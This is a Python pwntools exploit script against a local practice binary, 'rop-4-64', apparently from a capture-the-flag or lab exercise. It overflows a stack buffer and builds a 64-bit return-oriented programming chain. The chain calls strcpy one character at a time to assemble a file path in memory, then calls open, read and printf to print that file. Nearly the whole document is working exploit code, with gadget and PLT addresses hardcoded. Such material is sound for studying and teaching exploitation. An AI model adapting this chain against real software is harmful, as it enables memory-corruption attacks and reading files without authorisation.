#!/usr/bin/env python
from pwn import *

p = process("./rop-4-64")

'''
0x0000000000400863 : pop rdi ; ret
0x000000000040073f : pop rdx ; nop ; pop rbp ; ret
0x0000000000400861 : pop rsi ; pop r15 ; ret
'''

'''
0x00000000004005a0  printf@plt
0x00000000004005b0  read@plt
0x00000000004005d0  open@plt
0x00000000004006e2  strcpy
'''

buf = "A" * 0x80 + "BBBBBBBB"

openfile = 0x4005d0
readfile = 0x4005b0
printffile = 0x4005a0
strcpychar = 0x4006e2
store_addr = 0x601800
pop_rdi_ret = 0x400863
pop_rsi_r15_ret = 0x400861
pop_rdx_rbp_ret = 0x40073f

buf += p64(pop_rdi_ret)+p64(store_addr)+p64(pop_rsi_r15_ret)+p64(0x400908)+p64(0)+p64(strcpychar)
buf += p64(pop_rdi_ret)+p64(store_addr+1)+p64(pop_rsi_r15_ret)+p64(0x400891)+p64(0)+p64(strcpychar)
buf += p64(pop_rdi_ret)+p64(store_addr+2)+p64(pop_rsi_r15_ret)+p64(0x40089c)+p64(0)+p64(strcpychar)
buf += p64(pop_rdi_ret)+p64(store_addr+3)+p64(pop_rsi_r15_ret)+p64(0x4008a6)+p64(0)+p64(strcpychar)
buf += p64(pop_rdi_ret)+p64(store_addr+4)+p64(pop_rsi_r15_ret)+p64(0x400892)+p64(0)+p64(strcpychar)
buf += p64(pop_rdi_ret)+p64(store_addr+5)+p64(pop_rsi_r15_ret)+p64(0x400908)+p64(0)+p64(strcpychar)
buf += p64(pop_rdi_ret)+p64(store_addr+6)+p64(pop_rsi_r15_ret)+p64(0x4008b3)+p64(0)+p64(strcpychar)
buf += p64(pop_rdi_ret)+p64(store_addr+7)+p64(pop_rsi_r15_ret)+p64(0x4008b4)+p64(0)+p64(strcpychar)
buf += p64(pop_rdi_ret)+p64(store_addr+8)+p64(pop_rsi_r15_ret)+p64(0x40089a)+p64(0)+p64(strcpychar)
buf += p64(pop_rdi_ret)+p64(store_addr+9)+p64(pop_rsi_r15_ret)+p64(0x4008a8)+p64(0)+p64(strcpychar)
buf += p64(pop_rdi_ret)+p64(store_addr+10)+p64(pop_rsi_r15_ret)+p64(0x400908)+p64(0)+p64(strcpychar)
buf += p64(pop_rdi_ret)+p64(store_addr+11)+p64(pop_rsi_r15_ret)+p64(0x40089d)+p64(0)+p64(strcpychar)
buf += p64(pop_rdi_ret)+p64(store_addr+12)+p64(pop_rsi_r15_ret)+p64(0x400892)+p64(0)+p64(strcpychar)
buf += p64(pop_rdi_ret)+p64(store_addr+13)+p64(pop_rsi_r15_ret)+p64(0x400892)+p64(0)+p64(strcpychar)
buf += p64(pop_rdi_ret)+p64(store_addr+14)+p64(pop_rsi_r15_ret)+p64(0x400898)+p64(0)+p64(strcpychar)
buf += p64(pop_rdi_ret)+p64(store_addr+15)+p64(pop_rsi_r15_ret)+p64(0x4008dd)+p64(0)+p64(strcpychar)
buf += p64(pop_rdi_ret)+p64(store_addr+16)+p64(pop_rsi_r15_ret)+p64(0x400908)+p64(0)+p64(strcpychar)
buf += p64(pop_rdi_ret)+p64(store_addr+17)+p64(pop_rsi_r15_ret)+p64(0x40089b)+p64(0)+p64(strcpychar)
buf += p64(pop_rdi_ret)+p64(store_addr+18)+p64(pop_rsi_r15_ret)+p64(0x40089c)+p64(0)+p64(strcpychar)
buf += p64(pop_rdi_ret)+p64(store_addr+19)+p64(pop_rsi_r15_ret)+p64(0x4008c7)+p64(0)+p64(strcpychar)
buf += p64(pop_rdi_ret)+p64(store_addr+20)+p64(pop_rsi_r15_ret)+p64(0x4008e3)+p64(0)+p64(strcpychar)
buf += p64(pop_rdi_ret)+p64(store_addr+21)+p64(pop_rsi_r15_ret)+p64(0x4008dc)+p64(0)+p64(strcpychar)
buf += p64(pop_rdi_ret)+p64(store_addr+22)+p64(pop_rsi_r15_ret)+p64(0x4008e3)+p64(0)+p64(strcpychar)
buf += p64(pop_rdi_ret)+p64(store_addr+23)+p64(pop_rsi_r15_ret)+p64(0x4008de)+p64(0)+p64(strcpychar)
buf += p64(pop_rdi_ret)+p64(store_addr+24)+p64(pop_rsi_r15_ret)+p64(0x4008dc)+p64(0)+p64(strcpychar)
buf += p64(pop_rdi_ret)+p64(store_addr+25)+p64(pop_rsi_r15_ret)+p64(0x400908)+p64(0)+p64(strcpychar)
buf += p64(pop_rdi_ret)+p64(store_addr+26)+p64(pop_rsi_r15_ret)+p64(0x4008d0)+p64(0)+p64(strcpychar)
buf += p64(pop_rdi_ret)+p64(store_addr+27)+p64(pop_rsi_r15_ret)+p64(0x4008b3)+p64(0)+p64(strcpychar)
buf += p64(pop_rdi_ret)+p64(store_addr+28)+p64(pop_rsi_r15_ret)+p64(0x4008b4)+p64(0)+p64(strcpychar)
buf += p64(pop_rdi_ret)+p64(store_addr+29)+p64(pop_rsi_r15_ret)+p64(0x4008ba)+p64(0)+p64(strcpychar)
buf += p64(pop_rdi_ret)+p64(store_addr+30)+p64(pop_rsi_r15_ret)+p64(0x4008bc)+p64(0)+p64(strcpychar)
buf += p64(pop_rdi_ret)+p64(store_addr)+p64(pop_rsi_r15_ret)+p64(0)+p64(0)+p64(openfile)
buf += p64(pop_rdi_ret)+p64(3)+p64(pop_rsi_r15_ret)+p64(store_addr)+p64(0)+p64(pop_rdx_rbp_ret)+p64(100)+p64(0)+p64(readfile)
buf += p64(pop_rdi_ret)+p64(store_addr)+p64(printffile)

with open('test','wb')as f:
              f.write(buf);

p.sendline(buf)
p.interactive()
